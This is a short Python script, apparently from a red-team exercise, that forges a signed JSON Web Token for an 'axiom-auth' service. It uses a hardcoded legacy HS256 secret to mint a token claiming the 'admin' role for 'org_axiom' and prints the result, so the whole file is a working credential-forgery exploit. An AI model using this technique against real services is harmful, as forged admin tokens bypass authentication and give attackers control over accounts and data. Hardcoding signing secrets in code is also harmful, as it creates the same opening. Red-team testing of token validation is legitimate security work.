import base64
import hashlib
import hmac
import json
import time

KEY = b"axiom-auth-hs256-legacy-2019"
now = int(time.time())
header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "sub": "redteam_axiom_admin",
    "name": "Axiom Administrator",
    "role": "admin",
    "org": "org_axiom",
    "iss": "axiom-auth",
    "iat": now,
    "exp": now + 3600,
}

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

signing_input = ".".join([
    b64url(json.dumps(header, separators=(",", ":")).encode()),
    b64url(json.dumps(payload, separators=(",", ":")).encode()),
])
signature = b64url(hmac.new(KEY, signing_input.encode(), hashlib.sha256).digest())
token = signing_input + "." + signature
print(token)
